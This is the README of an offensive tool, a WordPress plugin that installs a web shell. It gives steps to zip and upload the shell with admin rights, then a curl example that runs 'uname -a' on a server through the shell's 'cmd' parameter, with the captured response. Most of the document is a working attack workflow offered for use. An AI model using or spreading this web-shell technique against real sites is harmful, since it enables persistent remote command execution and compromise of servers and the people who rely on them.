wordpress-shell
===============

Cheap &amp; Nasty Wordpress Command Execution Shell.

Execute Commands as the webserver you are serving wordpress with!
Uploaded shell will probably be at <host>/wp-content/plugins/shell/shell.php

Install
=======
To install the shell, we are assuming you have administrative access to the Wordpress install and can install plugins.
Either upload the zip file located in the `dist/` directory, or create your own archive with:

```bash
λ wordpress-shell → λ git master → zip -r shell.zip shell.php
  adding: shell.php (deflated 39%)
  
λ wordpress-shell → λ git master → ls -lah shell.zip
-rw-r--r--  1 bob  staff   492B Aug 29 14:17 shell.zip
```

Once uploaded, navigate to `/wp-content/plugins/shell/shell.php` and provide the `cmd` argument.

Sample Usage
============

```bash
root@kali:~# curl -v "http://192.168.0.1/wp-content/plugins/shell/shell.php?$(python -c 'import urllib; print urllib.urlencode({"cmd":"uname -a"})')"
* About to connect() to 192.168.0.1 port 80 (#0)
*   Trying 192.168.0.1...
* connected
* Connected to 192.168.0.1 (192.168.0.1) port 80 (#0)
> GET /wp-content/plugins/shell/shell.php?cmd=uname+-a HTTP/1.1
> User-Agent: curl/7.26.0
> Host: 192.168.0.1
> Accept: */*
> 
* additional stuff not fine transfer.c:1037: 0 0
* HTTP 1.1 or later with persistent connection, pipelining supported
< HTTP/1.1 200 OK
< Date: Thu, 28 Aug 2014 09:28:24 GMT
< Server: Apache/2.2.14 (Ubuntu)
< X-Powered-By: PHP/5.3.2-1ubuntu4
< Vary: Accept-Encoding
< Content-Length: 191
< Content-Type: text/html
< 
Linux wordpress-server 2.6.32-21-generic-pae #32-Ubuntu SMP Fri Apr 16 09:39:35 UTC 2010 i686 GNU/Linux
* Connection #0 to host 192.168.0.1 left intact
```
